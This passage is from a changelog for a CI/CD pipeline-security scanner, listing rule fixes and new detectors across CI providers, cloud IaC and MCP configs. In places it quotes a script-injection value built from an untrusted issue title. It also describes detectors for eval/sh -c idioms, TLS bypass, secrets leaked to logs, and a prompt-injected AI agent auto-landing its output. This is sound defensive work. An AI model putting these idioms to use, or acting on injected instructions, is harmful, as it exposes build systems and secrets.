# Changelog

All notable changes to this project are documented in this file.

The format is based on [Keep a Changelog](https://keepachangelog.com/en/1.1.0/),
and this project adheres to [Semantic Versioning](https://semver.org/spec/v2.0.0.html).

## [Unreleased]

PRs landing on `dev` between releases append entries below. The
release commit collapses this section into `## [X.Y.Z] - <date>`.

### Fixed

- **SCM-047 no longer fires on every C/C++ repo.** The linguist→CodeQL
  language map spelled C/C++ as `cpp`, but GitHub's default-setup
  `languages` enum uses `c-cpp`, so a C/C++ repo could never match its
  scanning config and always failed even when default setup analyzed it.
  Mapped `C`/`C++` to `c-cpp`. Found by the 2026-07 rule audit.
- **SCM-016 no longer fires on every repo.** The rule read
  `security_and_analysis.private_vulnerability_reporting.status` off the
  repo-metadata payload, but GitHub never returns private vulnerability
  reporting there — its state lives behind the dedicated
  `GET /repos/{owner}/{repo}/private-vulnerability-reporting` endpoint
  (`{"enabled": bool}`). The `SCMContext` hydrator now fetches that
  endpoint into a `private_vulnerability_reporting` slot and the rule
  reads `enabled` from it, passing with an unavailability note when the
  endpoint can't be reached instead of inferring "disabled" from an
  always-absent field. Found by the 2026-07 rule audit.
- **SCM-053 can now actually detect GitLab author self-approval.** The
  rule read `merge_requests_author_approval` off the `GET /projects/:id`
  payload, but GitLab exposes it only on `GET /projects/:id/approvals`,
  so `bool(None)` always resolved to "author approval disabled" and the
  misconfiguration was never flagged (a silent false negative on every
  GitLab scan). The GitLab hydrator now fetches the approvals endpoint
  into a `_gitlab_approvals` slot and the rule reads the field there,
  passing with an unavailability note when the endpoint can't be reached
  rather than inferring the safe posture. Found by the 2026-07 rule
  audit.
- **AZAPP-005 no longer flags every App Service.** The rule read a
  nonexistent `ftp_state` attribute off the Azure `SiteConfig`; the real
  property is `ftps_state`, so the missing attribute always fell back to
  the `AllAllowed` default and every App Service failed regardless of its
  true FTP setting. The rule now reads `ftps_state` (keeping `ftp_state`
  as a legacy-SDK fallback). Found by the 2026-07 rule audit.
- **Terraform S3-001..004 and SM-001 no longer false-fire on fresh
  plans.** These rules correlate a side-resource to an artifact bucket
  (or a rotation to a secret) by a join key (`bucket`, `secret_id`) that
  is a value computed at apply time. On a `terraform plan` that creates
  the bucket/secret in the same run the key is unresolved and
  `planned_values` omits it, so the join silently missed and the whole
  family reported CRITICAL/HIGH against a fully-configured plan. When a
  side-resource's join key is unresolved, an unmatched bucket/secret is
  now reported as "could not correlate, verify against applied state"
  (an informational pass) instead of a false failure; a genuinely
  missing side-resource still fails. SM-001 also now matches a
  `secret_id` written as a `.arn` interpolation, not only `.id`. Found
  by the 2026-07 rule audit.
- **Terraform PBAC-003 is now scoped to CodeBuild security groups.** It
  walked every `aws_security_group` in the plan, so an open-egress rule
  on an unrelated ALB/EC2/EKS group fired even with no CodeBuild present.
  It now gates on a VPC-configured `aws_codebuild_project` and, when the
  attached `security_group_ids` are resolvable, evaluates only those
  groups (matching the rule's documented CodeBuild scope). Found by the
  2026-07 rule audit.
- **Terraform TF-003 now honors `vpc_config.subnets`.** It failed a
  CodeBuild project whenever any subnet in the VPC was public, so the
  standard two-tier VPC (private build subnet + a public NAT/ALB subnet)
  always failed. It now evaluates the subnets the project actually
  attaches when they resolve, and only falls back to the VPC-wide
  heuristic when they can't. Found by the 2026-07 rule audit.
- **Terraform SM-002 no longer flags org-scoped wildcard principals.** A
  `Principal: "*"` narrowed by an `aws:PrincipalOrgID` condition (the
  AWS-documented cross-account pattern the rule's own recommendation
  suggests) is no longer reported as world-open. Found by the 2026-07
  rule audit.
- **Terraform SSM-001 no longer flags `oauth` / `author` parameter
  names.** The shared secret-name heuristic matched a bare `AUTH`
  substring, so a plain-`String` parameter like `/app/oauth_redirect_url`
  was reported as an unencrypted secret. `AUTH` now requires a secret-ish
  qualifier (`auth_token`, `auth_key`, ...); `AUTHORIZATION` still
  matches. Found by the 2026-07 rule audit.
- **Terraform TF-001 severity reconciled.** The emitted finding hardcoded
  CRITICAL while the rule metadata (docs, `explain`, MCP) said HIGH; the
  finding now uses HIGH to match. Found by the 2026-07 rule audit.
- **Terraform PBAC-005 no longer false-fires on fresh plans.** A
  per-action `role_arn = aws_iam_role.x.arn` is computed at apply time,
  so `planned_values` omits it and every action read as role-less
  ("all actions inherit the pipeline role"). The `TerraformContext` now
  exposes the plan's `after_unknown` metadata, and PBAC-005 treats an
  action whose `role_arn` is computed as declaring its own role rather
  than inheriting. Found by the 2026-07 rule audit.
- **Terraform S3-002/003/004 recognize AWS-provider-v3 inline blocks.**
  These rules only joined the standalone `aws_s3_bucket_versioning` /
  `aws_s3_bucket_server_side_encryption_configuration` /
  `aws_s3_bucket_logging` resources, so a stack pinned to AWS provider
  v3 (which configures these inline on `aws_s3_bucket`) was reported as
  unversioned/unencrypted/unlogged. Each rule now falls back to the
  inline block on the `aws_s3_bucket` before failing. Found by the
  2026-07 rule audit.
- **Terraform TF-002 documentation/dead-code cleanup.** The `docs_note`
  now lists `aws_secretsmanager_secret_version` (which the rule already
  scans), and the unreachable `_TF002_SKIP_TYPES` early-continue (none
  of its types were in the scan set) was removed. Found by the 2026-07
  rule audit.
- **CloudFormation CA-001 accepts an intrinsic CMK reference.** A
  CodeArtifact domain whose `EncryptionKey` points at an in-template KMS
  key via `!Ref` / `!GetAtt` (the only practical way to reference a
  stack-defined CMK) was reported as "not encrypted". It now reuses the
  same intrinsic-CMK resolution CCM-002 uses. Found by the 2026-07 rule
  audit.
- **CodePipeline CP-005 no longer treats `pre-prod` / `non-prod` as
  production.** Stage/action names like `PreProd`, `non-prod`, or
  `staging-prod` split into a `prod` token and were flagged as
  production stages missing a manual approval; a `prod` token
  immediately preceded by a negating prefix (`pre` / `non` / `staging`)
  no longer counts. Found by the 2026-07 rule audit.
- **Dockerfile DF-006 no longer flags benign config env vars.** It
  matched a credential *substring* in the key name plus any literal
  value, so `ENV TOKENIZERS_PARALLELISM=false`, `ENV TOKEN_TTL=3600`,
  and `ENV DB_PASSWORD_FILE=/run/secrets/db_pw` all fired a CRITICAL
  false alarm. Credential words are now matched as whole key segments
  (so `TOKEN` matches `ACCESS_TOKEN` but not `TOKENIZERS`), reference
  suffixes (`_FILE` / `_PATH` / `_TTL` / ...) are excluded, and the
  value must actually look secret-shaped (not a number, boolean/enum, or
  filesystem path). Found by the 2026-07 rule audit.
- **`poetry install` and `cargo install --locked` no longer flagged as
  missing lockfile enforcement.** The shared `PKG_NO_LOCKFILE_RE` flagged
  `poetry install` unless a (nonexistent) `--no-update` flag was present,
  but `poetry install` installs from `poetry.lock` (the lockfile-
  enforcing analog of `npm ci`); and `cargo install --locked` enforces
  `Cargo.lock`. `poetry install` is no longer flagged at all, and
  `cargo install` is exempt when `--locked` is present. Affects the
  no-lockfile rule across every provider (GHA-021 / GL-021 / ADO-021 /
  BB-021 / CC-021 / JF-021 / and the `_pkg_unpinned` variants). Found by
  the 2026-07 rule audit.
- **Kubernetes K8S-026 no longer flags internal load balancers.** A
  `Service` of `type: LoadBalancer` carrying a recognized internal-LB
  annotation (AWS `aws-load-balancer-internal` / `scheme: internal`, GKE
  `load-balancer-type: Internal`, Azure `azure-load-balancer-internal`)
  is private-network-only and never accepts 0.0.0.0/0, so a missing
  `loadBalancerSourceRanges` is no longer reported as internet exposure.
  Found by the 2026-07 rule audit.
- **PyPI PYPI-001/002 no longer flag `-r`/`-c` includes or `-e .`.** The
  requirements parser treated a nested-include directive (`-r base.txt`,
  `-c constraints.txt`) as a requirement, so PYPI-001 reported it as
  "missing a version pin" and PYPI-002 as "missing a hash" — a fully
  pinned file that layers a base file failed spuriously. The parser now
  classifies `-r`/`--requirement`/`-c`/`--constraint` as options, and
  PYPI-002 also skips editable/local/URL/VCS lines (which can't be
  hash-pinned). Found by the 2026-07 rule audit.
- **Tekton TKN-007 honors the v1 `taskRunTemplate.serviceAccountName`.**
  It only read the deprecated top-level `spec.serviceAccountName`, so a
  correct `tekton.dev/v1` PipelineRun pinning a least-privilege SA under
  `spec.taskRunTemplate` was reported as running the default SA. Found
  by the 2026-07 rule audit.
- **RubyGems GEM-010 no longer trips on `ruby File.read('.ruby-version')`.**
  The dynamic-Gemfile detector matched `File.read` anywhere, flagging the
  mainstream Rails idiom that pins the interpreter version (not a gem
  list). The `ruby File.read(...)` / `ruby file:` version-pin form is now
  excluded. Found by the 2026-07 rule audit.
- **Kubernetes K8S-037 no longer flags config values by key name alone.**
  A ConfigMap entry whose key contained a credential word (`token_endpoint`,
  `access_token_url`, `secret_name`) was flagged HIGH regardless of its
  value, so OAuth/OIDC endpoint URLs and secret *reference names* fired.
  The key-name path now requires the value to not be a URL and the key to
  not be a reference-suffix pointer (`_name`/`_url`/`_endpoint`/...), and
  AWS-key detection routes through `aws_key_in` so vendor-example keys are
  excluded. Found by the 2026-07 rule audit.
- **GCP GCSQL-003 recognizes the modern `sslMode`.** It read only the
  legacy `requireSsl` boolean, so a Cloud SQL instance that enforces TLS
  via `sslMode: ENCRYPTED_ONLY` (the recommended setting, and what current
  Terraform emits) was reported as "does not require SSL". It now passes on
  `sslMode` of `ENCRYPTED_ONLY` / `TRUSTED_CLIENT_CERTIFICATE_REQUIRED`,
  falling back to `requireSsl` when `sslMode` is absent. Found by the
  2026-07 rule audit.
- **GCP GCSQL-005 recognizes MySQL point-in-time recovery.** It read only
  `pointInTimeRecoveryEnabled` (PostgreSQL / SQL Server); MySQL surfaces
  PITR as `backupConfiguration.binaryLogEnabled`, so every MySQL instance
  with PITR enabled was flagged. Either field now counts. Found by the
  2026-07 rule audit.

## [1.18.0] - 2026-07-16

### Added

- **OpenVEX ingest and emit (`--vex` / `--output openvex`).** The SCA
  world is converging on VEX (OSV-Scanner V2, Trivy, Sigstore all ship
  OpenVEX), so the OSV advisory findings (`NPM-010` / `PYPI-009` /
  `MVN-009` / `NUGET-009`) now carry a structured `(vulnerability,
  product-PURL)` pair instead of only free text. `--output openvex`
  emits an OpenVEX 0.2.0 document, one `affected` statement per
  vulnerability with every affected product as a Package-URL and the OSV
  cross-reference aliases; the document `@id` is a content hash so an
  unchanged finding set yields a stable id. `--vex PATH` (repeatable)
  consumes an OpenVEX document and excludes from the gate (still
  reporting) any advisory finding whose `(vulnerability, product)` a
  maintainer marked `not_affected` or `fixed`, the same baseline-style
  handling `--baseline` gets. Matching is by vulnerability id or any
  alias (either direction) and by product PURL (a versionless product
  covers every version). Scoped to the CVE-shaped subset: a
  misconfiguration finding is never VEX-suppressed. Emit produces the
  triage worklist; `--vex` feeds the triaged verdicts back on the next
  run.
- **Native platform-control adoption posture (`scm_org` `ORG-014`,
  `ORG-015`).** As GitHub ships native pipeline-security controls, the
  highest-value check shifts from "you should pin / protect" to "the
  native control is on and enforced." `ORG-014` (MEDIUM) flags an org
  whose Actions policy does not require SHA-pinned actions
  (`sha_pinning_required: false` on `GET /orgs/{org}/actions/permissions`,
  the endpoint ORG-003 already fetches), the platform-native complement to
  GHA-001 that stops a retagged / backdoored action org-wide. `ORG-015`
  (MEDIUM) flags an org that does not enforce immutable releases
  (`enforced_repositories: none` on the GA
  `GET /orgs/{org}/settings/immutable-releases`), so a compromised
  maintainer account can still swap a published release asset or repoint a
  tag; `all` passes and `selected` passes with a partial-coverage note.
  Both pass with an "unavailable" note on GitHub Enterprise Server or an
  API version predating the control. Extends the org-governance pack; no
  engine change. `scm_org` 13 -> 15.
- **`analyze_manifest` MCP tool: scan a pipeline snippet as text.** The
  MCP server gains a 12th tool that scans a raw pipeline snippet passed
  as *text* (not a path), so an AI coding assistant can validate the
  workflow YAML / Dockerfile / manifest it just generated before the
  human commits it. `provider` is the reliable selector; omit it and a
  high-confidence content sniff (a Dockerfile `FROM`, a Kubernetes
  `apiVersion` + `kind`, a GitHub `runs-on:` / `uses:`) or a `filename`
  hint picks one, erroring with the supported-provider list when the
  snippet is ambiguous rather than risking a wrong-scanner result. The
  snippet is written to a throwaway temp file at the provider's canonical
  name (so the file-based scanners run unchanged) and the temp path is
  stripped back out of the reported resource. Scoped to the file-based
  providers; live providers (`aws` / `scm` / ...) have no single-snippet
  form. Makes pipeline-check the guardrail on AI-generated pipelines.
- **Committed unsafe-serialization model artifact (modelfile `MODEL-006`).**
  Flags a committed model-weight file, anywhere in the scanned tree, whose
  format deserializes arbitrary code at load: `.pkl` / `.pickle` / `.pt` /
  `.pth` / `.ckpt` / `.joblib` / `.dill` / `.keras` on the extension alone,
  and the ambiguous `.bin` / `.h5` / `.hdf5` only when the name looks like a
  model (`pytorch_model.bin`) or a model config / Modelfile sits alongside.
  `.safetensors` / `.gguf` / `.onnx` are the safe formats and never fire.
  The tree-wide complement to `MODEL-003`, which only fires on a Modelfile
  `FROM` reference. A format / provenance check, not pickle-opcode analysis
  (ModelScan / ModelAudit own that).
- **MCP-config security pack (devenv `DEV-009`, `DEV-010`, Zed surface).**
  Two new rules extend the MCP-config coverage past DEV-007's stdio
  command servers. `DEV-009` flags a committed MCP config that reaches a
  *remote* server over plaintext `http://` to a non-loopback host (the
  tool stream crosses the network in the clear, so an on-path attacker
  can read or rewrite the tools the agent is offered); loopback and
  `https://` endpoints pass. `DEV-010` flags a *blanket* tool
  auto-approval (`autoApprove: true` / `["*"]`, Cline's
  `alwaysAllow: ["*"]`), which removes the human confirmation so a
  poisoned or rug-pulled tool runs silently; a scoped named-tool
  allow-list passes. Both also read Zed's `.zed/settings.json`
  `context_servers` block, a new committed surface all the MCP rules
  (DEV-007/008/009/010) now cover, including Zed's nested
  `command: {path, args}` shape.
- **Continue config surface for the MCP rules (devenv).** The
  developer-environment scanner now reads Continue's YAML configs
  (`.continue/config.yaml` and `.continue/mcpServers/*.yaml`), so the MCP
  rules (DEV-007/008/009/010) cover them. Continue declares `mcpServers`
  as a YAML *list* of objects (each with a `name`), which the shared
  server-spec walker now handles alongside the JSON object shape used by
  Claude / Cursor / VS Code / Zed. The devenv loader gained a YAML path
  (via the repo's duplicate-key-rejecting loader) for these files.

### Fixed

- **Terraform / CloudFormation IAM checks no longer crash-degrade to a
  silent pass on scalar policy shapes.** An `aws_iam_role` whose trust
  policy is authored with a single-dict `Statement` (not a list) or a
  bare string `Principal: "*"` made the shared `_role_is_cicd` /
  `is_oidc_trust_stmt` helpers raise `AttributeError`. The per-rule
  guard caught it, but that degraded the whole IAM-* family to a passing
  "could not be evaluated" finding, so a genuinely CI/CD-scoped
  `AdministratorAccess` role written in the single-dict form was never
  flagged (IAM-001..008). The helpers now normalize `Statement` through a
  shared `iter_statements` and type-guard `Principal`, so the rules
  evaluate these shapes instead of silently passing them. Found by the
  2026-07 rule audit.
- **More scalar-shape crash-degrades fixed across the file-based
  providers.** Same class as above: a value the format allows to be a
  scalar, list, `null`, or unresolved plan-time reference reached a `.get`
  that assumed a mapping, so the rule crashed and (via the per-rule guard)
  degraded to a silent pass. Fixed Terraform `S3-005` (single-dict /
  non-object bucket policy), `ECR-003` (single-dict / top-level-list repo
  policy), `LMB-003` (`environment.variables` as an unresolved reference),
  and `CB-004` (`build_timeout` as a reference string, which also corrects
  the unset-timeout description); CloudFormation `ECR-005` and
  `S3-001..004` (a nested config block authored as a bare scalar, via a new
  shared `as_map` helper); Azure `ADO-012` (numeric `key:` / `restoreKeys:`);
  Argo CD `ARGOCD-019` (ApplicationSet `spec` authored as a YAML list); and
  Bitbucket `BB-005` (non-mapping `options:`). Found by the 2026-07 rule
  audit.
- **`pip install -U` is detected again (`GHA-022`, `GL-022`, and the
  BB/ADO/CC clones).** `DEP_UPDATE_RE` matched a case-sensitive `-U`, but
  the rules scan a lowercased command blob where it has become `-u`, so the
  common short form of `pip install --upgrade` was never flagged (dead
  code). The pattern (and the tooling-exemption pattern, so `pip install -U
  pip` stays exempt) now matches `-[uU]`.
- **`KMS-002` no longer flags the AWS default key policy (aws + Terraform).**
  The check reported the `kms:*`-to-account-root "Enable IAM User
  Permissions" statement that AWS creates on essentially every
  customer-managed key. A new shared `principal_is_only_account_root`
  helper exempts the root baseline (a role ARN ending in `:role/root` is
  not treated as root); a wildcard grant to any non-root principal still
  fires. CloudFormation already handled this.
- **Jenkins shell rules now scan the `sh(script: "...")` named-argument
  form.** The shared `SHELL_STEP_RE` only matched a body immediately after
  the step keyword, so `sh(script: "...")`, `sh label: 'x', script: "..."`,
  and `sh(returnStdout: true, script: "...")` (the mainstream way to write
  a step that returns stdout) escaped `JF-002` / `JF-030` / `JF-036` /
  `JF-037` and the model/AI shell rules. The regex also gained word
  boundaries so a token merely ending in `sh` (`publish`, `finish`) is no
  longer read as a shell step. Azure `ADO-027` gained the analogous fix,
  reading the explicit-task form (`task: Bash@3` / `CmdLine@2` /
  `PowerShell@2` with `inputs.script`). Found by the 2026-07 rule audit.
  The named-argument sub-pattern was then hardened against a
  regular-expression denial of service: a crafted `sh(` prefix with many
  `name:` fragments could trigger exponential backtracking. A `script`
  exclusion plus removing an overlapping-whitespace quantifier keep the
  match linear.

### Changed

- **Terminal scan headline now reconciles a strong grade with open
  failures.** When the grade is A or B but the scan still has failing
  checks, the headline adds one line ("Grade is a severity-weighted
  posture score; N check(s) still failed") so a green "Grade A" can't be
  read as a clean bill of health. The gate summary already made this
  point when a gate was configured; this covers the plain scan, which
  far more users see.
- **Scan headline box matches the findings-table width.** The header
  panel previously expanded to the full terminal width while the table
  sized to its content, leaving a wide empty box over a narrow table on a
  big terminal. The header now sizes to the table (and never below its own
  text, so the prose doesn't wrap on a tiny scan).
- **Repeated detail panels collapse across files.** When the same rule
  fires on several resources with byte-identical prose (a generic
  "Artifacts not signed" on four workflows), the per-resource panels now
  collapse into one panel that lists every affected resource under an
  "Affected resources" block. Panels whose text differs per file stay
  separate, so no per-file detail is lost. The findings table is
  unchanged (still one row per file), and `--no-group` keeps every panel
  unrolled (one per finding) to match the unrolled table.
- **Findings-table Resource column is width-aware.** The path now scales
  to the console width and head-truncates so the filename and line number
  stay on one line ("…workflows/release.yml:172") instead of folding
  mid-filename on a narrow terminal. A wide terminal still shows the full
  path.
- **`pipeline_check init` "top to fix first" shortlist renders as an
  aligned table.** The previous hand-padded layout spilled a long title
  onto an unindented second line on a narrow terminal; it now wraps under
  its column. The resource shows the filename only (the full path is one
  step away via `pipeline_check`).
- **`pipeline_check explain` leads with the plain-English explanation,
  and its section headers adopt the brand `// section` eyebrow style.**
  The compliance crosswalk and CWE moved from the top of the output to a
  `// compliance & standards` block at the foot, so what-it-checks /
  how-to-fix / proof-of-exploit come first. Section labels now read
  `// what it checks`, `// how to fix`, and so on (matching the docs site
  and HTML report) instead of `[What it checks]`. The JSON and SARIF
  outputs still carry the full control mappings for auditors.
- **`--list-checks`, `--list-chains`, and `--list-fixers` color the
  severity column on a terminal.** The listings now use the same severity
  scale as the scan report when stdout is a TTY. Piped or redirected
  output stays plain (no ANSI), so the listings remain greppable and
  byte-identical for scripts.

## [1.16.0] - 2026-06-14

### Added

- **HARNESS-019: Harness pipeline step lacks an explicit timeout.** A
  best-practice / missing-control rule (LOW, dropped by
  `--no-best-practice`) that flags a step carrying no `timeout` of its own
  whose enclosing stage carries none either; a stage-level timeout bounds
  all of its steps, and a runtime input (`<+input>`) counts as set. Closes
  the last cross-provider gap in the build-time-timeout hygiene family
  (the Harness analog of TKN-006 / GHA-015 / GCB-005).

### Fixed

- **Script-injection detection no longer treats a `${{ }}` expression as
  safe when an ordinary shell variable shares the line.** The safe-idiom
  recognizer (`is_quoted_assignment`) whitelisted `VAR="...$X..."` captures
  but had no guard for GitHub `${{ }}`, which is substituted into the script
  before the shell runs. A value like `VAR="$HOME/${{ github.event.issue.title }}"`
  slipped past GHA-003 and GHA-119; it is now flagged.
- **GHA injection taint set widened: `github.event.inputs.*`, case-insensitive
  function names, and `format()` second arguments.** The shared
  `UNTRUSTED_CONTEXT_RE` missed the `github.event.inputs.<name>`
  workflow_dispatch form, matched function names case-sensitively (GitHub
  expressions are case-insensitive, so `fromjson(...)` bypassed it), and never
  matched `format('template', github.event.issue.title)` because the untrusted
  value is the second argument. All three are now caught across GHA-003 /
  GHA-011 / GHA-035 / GHA-036 / GHA-119.
- **Compromised-action check no longer flags the remediated trivy-action
  release.** The `aquasecurity/trivy-action` entry matched any `v0.x.y` tag,
  so the fixed `v0.35.0` (the compromise covered 0.0.1 through 0.34.2) was
  reported as compromised. The range is now capped at 0.34.x.
- **`set +x` no longer reported as a secret trace-log leak.** The shell-trace
  detector matched both `set -x` (which enables xtrace) and `set +x` (which
  disables it, the secure idiom used right before handling a secret). The
  leading sign is now `-` only, matching the long-form behavior that already
  ignored `set +o xtrace`. Removes a false positive in the log-leak family
  (GL-036 / BB-032 / ADO-031 / CC-032 / HARNESS-013).
- **`curl` insecure flag detected inside bundled short-flag clusters.** The
  TLS-bypass detector only matched a standalone `-k`, missing the dominant
  real-world forms `curl -sk` / `curl -ks` / `curl -fsSLk` / `curl -kL`. It
  now matches a lowercase `k` anywhere in a single-dash flag cluster while
  still ignoring the uppercase `-K` (`--config`) flag. Closes a false
  negative for every provider's TLS-bypass rule.
- **`go env -w GOSUMDB=off` (the persistent form) is now flagged.** The Go
  module-integrity check only matched `export` / inline assignments and missed
  the canonical persistent-config form. Affects GHA-110 / GL-037 / CC-033.
- **Lockfile-integrity check no longer lets a pinned git dep mask an unpinned
  sibling.** A pinned `git+...@<sha>` earlier on a `pip install` / `npm install`
  line suppressed the finding for an unpinned dep later on the same line; each
  git dependency is now evaluated on its own.
- **Floating-tag classification catches digit-bearing rolling channels.**
  A tag was treated as a pinned version if it contained a digit anywhere, so
  `:nightly-2024` / `:stable-3` were misread as pinned. Named rolling channels
  (`latest`, `nightly`, `edge`, `stable`, ...) are now floating regardless of
  an incidental date or sequence digit, while real version tags (`:20-bookworm`,
  `:3.11`) stay pinned. Fixes a false negative in the image-pinning family
  (DR-005 plugin tags, GL-001 / GL-028 / JF-009, K8S / Dockerfile pinning).
- **Unpinned-model check treats `revision=None` as unpinned.** `from_pretrained(
  ..., revision=None)` is the explicit mutable-default-branch value, but was read
  as a pin. Affects GHA-121 / GL-046.
- **Slack secret detection recognizes `xapp-` (app-level) and `xoxe-` (rotation
  refresh) token prefixes**, which the older `xox[abprs]-` charset missed.
- **Vulnerability-scan detection now recognizes the reusable-action,
  container-image, and native-step forms of the scanners.** `VULN_SCAN_TOKENS`
  carried only space-delimited CLI tokens (`trivy `, `grype `, `snyk `), so
  the most common wiring (a pinned `uses: aquasecurity/trivy-action`,
  `anchore/scan-action`, or `snyk/actions`; a scanner image like
  `aquasec/trivy`; a Harness STO `type: AquaTrivy` step) was missed and the
  build was falsely flagged "No vulnerability scanning step." GHA-098 / GHA-004
  already treated these refs as scanners, so GHA-020 disagreed with them on
  the same workflow. Fixes a false positive shared by GHA-020 / GL-019 /
  BK-012 / TKN-012 / CC-020 / ARGO-012 / DR-022 / HARNESS-018.
- **Harness command rules now scan every shell phase, not just `spec.command`.**
  `RunTests` `preCommand` / `postCommand` and `Background` `entrypoint` / `args`
  carry user-authored shell, but were invisible to the scanner, so an injection
  or secret-leak idiom there passed silently. `step_command_text` now joins all
  of them, closing the blind spot across HARNESS-002 / 005 / 008..014.

## [1.15.0] - 2026-06-14

### Changed

- **BK-016 / DR-017 standards mappings harmonized with the
  dangerous-shell-idiom family.** The Buildkite and Drone members of the
  `eval` / `sh -c` family were under-mapped to 7 standards while the other
  eight members (GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 / HARNESS-014
  / TKN-018 / ARGO-019) carry the full 12-standard code-execution mapping.
  Backfilled both into the five missing standards (cis_supply_chain,
  nist_800_190, openssf_scorecard, oscr, slsa) with
  `scripts/clone_standards_mapping.py` (its skip-already-mapped behavior
  makes it a clean backfill tool, not just a new-rule cloner), so a
  Buildkite / Drone `eval` finding now evidences the same controls as
  every other provider's. No rule or behavior change.
- **AC-040 (prompt-injected agent auto-lands its output) extended to
  CircleCI.** The injection->autoland kill chain now correlates the
  CircleCI agentic-AI pair (CC-037 injection + CC-038 autoland) on the
  same `.circleci/config.yml`, alongside the GitHub / GitLab / Bitbucket /
  Azure DevOps / Jenkins / Harness pairs it already covered. With the
  CircleCI AI rules now landed, this closes the gap where CC-037 + CC-038
  on one config would not compose into the CRITICAL chain. The chain count
  is unchanged (the legs widened, not a new chain); AC-040 now spans all
  seven script-based providers that carry the agentic-AI rule pack.
- **Loader robustness fuzzing moved to Hypothesis.** The generative pass
  in `tests/test_loader_robustness.py` that throws arbitrary inputs at the
  shared YAML loader was a hand-seeded `random` battery (the dev deps were
  hash-locked, so Hypothesis was deferred). It is now a Hypothesis
  property test: `st.recursive` structured documents plus `st.binary` /
  `st.text` blobs, with `derandomize=True` to stay reproducible / CI-stable
  while gaining automatic shrinking to a minimal reproducer on failure.
  `hypothesis` added to `requirements-dev.in` and the hash-locked
  `requirements-dev.txt`. The curated pathological battery and the
  differential parser-shape tests are unchanged.
- **Rego engine modules brought into coverage measurement.** The
  `--rego-rules` loader / runner / errors modules were omitted from the
  gated coverage run because their integration tests skip without the
  `opa` binary (absent in CI), leaving them at 13-58% measured. New
  binary-free mock tests (`tests/custom/test_rego_mocked.py`, 51 cases)
  exercise every pure-logic helper directly and mock the two external
  seams (`shutil.which("opa")` and `subprocess.run`), raising the three
  modules to 97-100% and letting them come off the coverage-omit list.
  Whole-repo coverage stays above the 90% gate (91.8%).
- **`fleet.py` brought into coverage measurement; the omit list is now
  empty and removed.** `fleet.py` was the last omitted module (its 71
  tests ran in a separate, non-coverage `test-fleet` CI job). The main
  test step now runs the suite under xdist with the fleet tests excluded,
  then runs them serially with `--cov-append`, so their coverage combines
  into the gated total (`fleet.py` measured at 88%, repo at 91.8%). The
  redundant `test-fleet` job and the `.github/coveragerc-no-fleet` file
  are removed, and the step uses `shell: bash` so the two invocations
  share fail-fast semantics on the Windows runner too. Every
  `pipeline_check` module is now measured against the 90% gate.

### Added

- **HARNESS-015..018: supply-chain hygiene gates brought to Harness
  (MEDIUM).** The Harness counterpart of the Drone gates below: HARNESS-015
  (no signing), HARNESS-016 (no SBOM), HARNESS-017 (no SLSA provenance),
  HARNESS-018 (no vuln scanner), reusing the same shared `tokens.py`
  detectors over the Harness pipeline document. Signing / SBOM / provenance
  are scoped to artifact-producing pipelines; the vuln-scan gate fires on
  any pipeline with no scanner. All four registered in `BEST_PRACTICE_IDS`
  (demoted to LOW by the confidence-tiering). With this, **both Harness and
  Drone reach parity** with the other ten CI providers on the
  signing / SBOM / provenance / vuln-scan family. Standards cloned from the
  Buildkite analogs. `harness` 14 -> 18.
- **DR-019..022: supply-chain hygiene gates brought to Drone (MEDIUM).**
  Drone lacked the artifact-signing / SBOM / SLSA-provenance / vuln-scan
  gate family that the other ten CI providers carry. DR-019 (no
  cosign/sigstore signing step), DR-020 (no syft/cyclonedx SBOM), DR-021
  (no SLSA provenance attestation), and DR-022 (no trivy/grype/snyk
  scanner) reuse the shared `tokens.py` detectors (`produces_artifacts` /
  `has_signing` / `has_sbom` / `has_provenance` / `has_vuln_scanning`), so
  detection matches GHA-006/007/024/020 and the BK / TKN analogs exactly.
  Signing / SBOM / provenance only fire on artifact-producing pipelines
  (a `docker build` / `push` / `buildah` / `kaniko` step), so lint /
  test-only pipelines don't trip them; the vuln-scan gate fires on any
  pipeline with no scanner. All four are registered in `BEST_PRACTICE_IDS`,
  so the confidence-tiering demotes them to LOW (visible at the default
  threshold, hidden at `--min-confidence MEDIUM`). Standards cloned from
  the Buildkite analogs with `scripts/clone_standards_mapping.py`. `drone`
  18 -> 22.
- **HARNESS-014 + TKN-018 + ARGO-019: dangerous-shell-idiom rule extended
  to Harness, Tekton, and Argo (HIGH).** The `eval "$VAR"` / `sh -c "$VAR"`
  / backtick-exec family (GHA-028 / GL-026 / BB-026 / ADO-027 / CC-027 /
  BK-016 / DR-017) now covers the three remaining shell-surface providers
  that lacked it. Each fires on intrinsically risky idioms that hand a
  value full shell-grammar reach, regardless of whether the input is
  currently trusted (complementing the per-provider untrusted-input rules
  HARNESS-002 / TKN-003 / ARGO-005), via the shared `_primitives.shell_eval`
  detector over the provider's shell surface (Harness step `command`,
  Tekton step `script`, Argo `script.source` / `container.args`). The
  `eval "$(ssh-agent -s)"` bootstrap idiom is intentionally not flagged.
  Standards cloned from CC-027 (the correctly-mapped family member, 12
  standards) with `scripts/clone_standards_mapping.py`. `harness` 13 -> 14,
  `tekton` 18 -> 19, `argo` 19 -> 20.
- **TKN-017 + ARGO-018 + GCB-028: log-leak rule completed across the
  remaining shell providers (HIGH).** Finishes the log-leak family
  (GHA-033 / GL-036 / BB-032 / ADO-031 / CC-032 / JF-042 / HARNESS-013 /
  BK-017 / DR-018) for Tekton, Argo Workflows, and Google Cloud Build, so
  every CI provider with a shell command surface now flags secrets printed
  to the log. Each scans the provider's shell surface (Tekton step
  `script`, Argo template `script.source` / `container.args`, Cloud Build
  step `entrypoint` / `args` / `script`) for a secret-named variable
  handed to `echo` / `printf` / `cat` / `tee`, an `env` / `printenv` dump,
  or `set -x` with a secret-named variable in scope, via the shared
  `_primitives/log_leak` detector. GCB-028 normalizes Cloud Build's `$$`
  escaping to `$` and scans each arg on its own (a `bash -c '<script>'`
  step keeps the script in a single arg). Standards cloned with
  `scripts/clone_standards_mapping.py` (10 each). The `nist_800_190`
  per-framework coverage floor drops 53 -> 52 (container-scoped; the
  secret-hygiene rules dilute the denominator without container coverage).
  `tekton` 17 -> 18, `argo` 18 -> 19, `cloudbuild` 27 -> 28.
- **BK-017 + DR-018: log-leak rule extended to Buildkite and Drone
  (HIGH).** Continues the log-leak family (GHA-033 / GL-036 / BB-032 /
  ADO-031 / CC-032 / JF-042 / HARNESS-013) into two more shell-command CI
  providers. Each scans every step command (`command` / `commands`) for a
  secret-named variable handed to `echo` / `printf` / `cat` / `tee`, an
  `env` / `printenv` dump, or `set -x` with a secret-named variable in
